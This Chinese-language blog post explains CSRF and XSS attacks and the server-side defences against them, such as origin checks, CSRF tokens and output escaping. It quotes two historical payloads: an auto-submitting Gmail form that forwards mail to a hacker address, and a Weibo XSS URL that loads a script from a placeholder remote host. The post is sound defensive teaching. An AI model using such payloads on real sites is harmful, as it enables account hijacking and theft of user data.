---
title: 服务器安全校验
date: 2021-05-11 21:37:08 
tags: CSRF、XSS、安全校验
---
## 前言介绍 

服务器如果对所有请求内容一并接收的话，很容易带来很多安全风险问题，比如`CSRF`攻击、`XSS`攻击。所以，服务端的安全校验尤为重要，
不仅保障了服务的稳定性，也保证了用户的利益不受侵犯。

## 常见漏洞 

### CSRF攻击（Cross site request forgery跨站请求伪造） 

`CSRF`攻击实例 - gmail邮箱的`CSRF`漏洞
这一天，大卫同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了大卫的注意：

    甩卖比特币，一个只要998！！

聪明的大卫当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。

果然，这只是一个什么都没有的空白页面，大卫失望的关闭了页面。一切似乎什么都没有发生……

在这平静的外表之下，黑客的攻击已然得手。大卫的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到`hacker@hackermail.com`。

大卫还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。

不久之后的一天，大卫发现自己的域名已经被转让了。懵懂的大卫以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，大卫才开始觉得不太对劲。

大卫仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。大卫回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：

```html
<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data">
       <input type="hidden" name="cf2_emc" value="true"/>
       <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/>
      .....
       <input type="hidden" name="irf" value="on"/>
       <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/>
</form>
<script>
    document.forms[0].submit();
</script>
```

    这个页面只要打开，就会向Gmail发送一个`post`请求。请求中，执行了“`Create Filter`”命令，将所有的邮件，转发	
    到“`hacker@hackermail.com`”。

大卫由于刚刚就登陆了Gmail，所以这个请求发送时，携带着大卫的登录凭证（`Cookie`），

Gmail的后台接收到请求，验证了确实有大卫的登录凭证，于是成功给大卫配置了过滤器。

黑客可以查看大卫的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。

大卫很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了……

以上就是大卫的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，
此事件原型是2007年Gmail的`CSRF`漏洞：
[Google’s Gmail security failure leaves my business sabotaged](https://www.davidairey.com/google-Gmail-security-hijack/)

### CSRF攻击的特点 

攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的凭证，达到冒充用户对被攻击的网站执行某项操作的目的。

- 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。

- 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。

- 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。

- 跨站请求可以用各种方式：图片`URL`、超链接、`CORS`、`Form`提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。

## XSS攻击（Cross site scripting 跨站脚本攻击） 

### XSS攻击实例 - 新浪微博名人堂反射型 XSS漏洞 

攻击者发现 http://weibo.com/pub/star/g/xyyyd 这个 `URL`的内容未经过滤直接输出到`HTML` 中。

于是攻击者构建出一个` URL`，然后诱导用户去点击：


    http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>


```html
<li>
  <a href="http://weibo.com/pub/star/g/xyyyd">
    <script src=//xxxx.cn/image/t.js></script>
    ">按分类检索
  </a>
</li>
```

浏览器接收到响应后就会加载执行恶意脚本`//xxxx.cn/image/t.js`，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击`URL`，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“`XSS蠕虫`”。

### XSS攻击的特点

 `Cross-Site Scripting`（跨站脚本攻击）简称` XSS`，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，
使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如`Cookie`、`SessionID` 等，进而危害数据安全。

`XSS` 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

- 在 `HTML` 中内嵌的文本中，恶意内容以 script 标签形成注入。

- 在内联的 `JavaScript `中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。

- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。

- 在标签的 `href`、`src` 等属性中，包含 `javascript:` 等可执行代码。

- 在 `onload`、`onerror`、`onclick` 等事件中，注入不受控制代码。

### `XSS`攻击的分类

####  存储型`XSS`（数据库注入恶意代码，危害最大） 

1. 攻击者将恶意代码提交到目标网站的数据库中。
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 `HTML` 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

#### 反射型XSS`（`url`参数嵌入恶意代码） 

1. 攻击者构造出特殊的 `URL`，其中包含恶意代码。
2. 用户打开带有恶意代码的 `URL` 时，网站服务端将恶意代码从 `URL` 中取出，拼接在 `HTML` 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

反射型 `XSS` 漏洞常见于通过 `URL` 传递参数的功能，如网站搜索、跳转等。

#### `DOM` 型 `XSS `

1. 攻击者构造出特殊的 `URL`，其中包含恶意代码。
2. 用户打开带有恶意代码的 `URL`。
3. 用户浏览器接收到响应后解析执行，前端 `JavaScript` 取出 `URL` 中的恶意代码并执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

`DOM` 型 `XSS` 跟前两种 `XSS` 的区别：`DOM` 型 `XSS` 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 `JavaScript` 自身的安全漏洞，
而其他两种 `XSS` 都属于服务端的安全漏洞。

## 服务器安全校验设计 

### 针对`CSRF`的防御策略 

#### 1、同源验证防御 

可以通过阻止不明外域的访问来防御`CSRF`攻击，在`HTTP`协议中，每一个请求都会携带`Header`，`Header`中有字段用于标记域名来源：

- Origin Header

- Referer Header

##### Origin Header 

通过第三方域名发起的请求中，`Request Header`中的`Origin`字段指向了第三方域名，如果Origin
Header存在，服务端可以根据请求中的`Origin`字段进行判断该请求是否正常，如果来自于第三方站点，则拒绝该请求。

##### Referer Header 

在`HTTP Request Header`中有一个字段叫`Referer`，记录了该HTTP请求的来源地址。 对于`Ajax`请求，图片和`script`等资源请求，`Referer`为发起请求的页面地址。

由于`Origin`在请求头中不一定存在，`Referer`在某些情况下也是可以伪造或隐藏的，

所以，如果在请求头中，`Origin`以及`Referer`两个字段都不存在或者存在问题时，建议直接拒绝该请求。

```
以上所说的CSRF攻击属于第三方域名发起的攻击，通过同源验证也可以防范掉绝大部分的第三方域名CSRF攻击，但这并不是万无一失的。针对于本域直接发起的CSRF，比如攻击者有权限在页面下发布评论（比如链接、图片、富文本等，统称UGC：User Generated Content），那么就可以直接在本域发起攻击，这种情况下同源验证并不能抵御，所以需要服务端对关键接口做额外的防御措施。
```

#### 2、使用`Token`

 **JSP服务端渲染的情况** 

- 将CSRF Token写入页面中
  可以在客户端请求页面时，生成一个`token`，该`token`通过加密算法对数据进行加密（一般包括了随机字符串和时间戳），然后将`token`写入服务端模板页面`form`标签和`a`标签中，再下发给客户端

- 页面发送请求时携带`token `

  客户端在发送请求时，会带上`token`标签，这是第三方域名发起请求无法做到的，比如：

  `get`请求：http://url?csrftoken=tokenvalue

  `Post`请求：由于`form`表单中有：

  ```html
  <input type="hidden" name="csrftoken" value="tokenvalue"/>
  ```

- 服务器验证`token` 

  服务器接收到客户端请求时，从请求中解析出`token`进行解密，对比加密字符串以及时间戳，如果加密的字符串一致且时间未过期，那么`token`就是有效的，可以执行相应的业务逻辑

**前后端分离的情况** 

- 将`token`写入`cookie`中

- 在用户登录时，写入`csrf-token`到客户端的`cookie`中，内容可以为随机字符串（如`csrfToken = v8g9e4ksfhw`）

- 在客户端发起请求时，将`cookie`中的`token`值取出，写入请求参数中

- 服务器接收到请求后，对比`cookie`中的`token`和请求参数中的`token`，如果一致，则请求有效，如果请求中`token`不存在或与`cookie`中的`token`不一致，则拒绝请求

利用`token`防御的原理就在于：第三方域名发起跨站脚本攻击请求时，是通过冒用用户的身份来发起请求，但无法得知这个`token`，所以也无法在请求中加入`token`参数，从而实现对`CSRF`的防御。

#### 3、二次验证 

在关键请求提交时如转账，要求用户进行二次身份验证，如密码、图片验证码、短信验证码等。

### 针对XSS的防御策略 

    思考问题：仅在前端做输入校验并进行过滤有用吗？

#### 预防反射型XSS 

该类`XSS`攻击常发生于服务端下发页面的情况下，服务器读取`Url`参数然后再写入`html`下发给浏览器。

针对于这种情况：

1. 需要对`html`做足充分的转义

   如果拼接`HTML`是必要的，就需要采用一些合适的转义库，对`HTML`模板插入点进行充分的转义

   常用的模板引擎比如`ejs`、`doT.js`等，对HTML的转义通常只有一个规则，就是把`&<>"'/`这些字符转义掉，能起到一定的效果，但还不够完善，需要由开发者自行去补充，做到更加细致的转义策略。

2. 可以改成前后端分离的结构，服务器下发静态资源，通过`ajax`请求拉取数据渲染页面。

#### 预防存储型XSS 

该类`XSS`攻击通过将恶意代码上传到服务器数据库中，在用户打开页面的时候对页面的代码进行注入，这类攻击常见于评论展示、论坛发帖等页面中。

针对于该类攻击，最重要的预防策略：


    对用户提交的内容（UGC）进行充分的校验
    并且在取出数据写入页面时进行转义，防止恶意代码直接写入HTML


此外，`XSS`攻击很多时候用于窃取用户信息，比如直接通过`document.cookie`进行页面中用户信息`cookie`的获取，服务端可以通过设置`cookie`的属性`http-only`为`true`，这样便可降低xss攻击带来的危害。

#### 预防DOM型XSS 

- 在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 `HTML` 插到页面上，而应尽量使用 `.textContent`、`.setAttribute()`等。

- 如果用 `Vue` 技术栈，不使用 `v-html/dangerouslySetInnerHTML` 功能，在前端 `render` 阶段避免 `innerHTML`、`outerHTML` 的 `XSS` 隐患。

## 总结

本文对`CSRF`以及`XSS`的攻击进行了介绍，并阐述了两种攻击的各自的特点，也提供了一些防御措施。但在真正实践时，应该结合防御策略与自身实际的情况进行综合考虑。网络上没有绝对的安全，只有相对的防御，根据自身系统所需要的安全系数，做出相应的防御措施，在保证不被攻击的同时也能使投入产出比达到最优。



## 参考资料：

[Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin)

[Referer](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer)

[如何防止CSRF攻击？](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)

[如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)

[XXS-GAME](https://xss-game.appspot.com/)

[什么是XSS攻击，XSS攻击可以分为哪几类？如何防范XSS攻击？](https://github.com/YvetteLau/Step-By-Step/issues/18)





